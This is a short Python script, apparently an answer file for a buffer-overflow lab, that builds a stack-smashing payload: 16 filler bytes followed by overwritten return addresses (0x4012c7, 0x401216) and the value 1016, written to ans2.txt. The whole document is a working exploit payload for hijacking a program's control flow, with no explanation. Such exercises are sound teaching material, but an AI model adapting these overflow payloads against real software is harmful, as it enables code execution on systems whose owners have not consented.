# 401216
# 1016
payload=b'a'*16+b"\xc7\x12\x40\x00\x00\x00\x00\x00"+b"\xf8\x03\x00\x00\x00\x00\x00\x00"+b"\x16\x12\x40"+b"\x00"*5
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")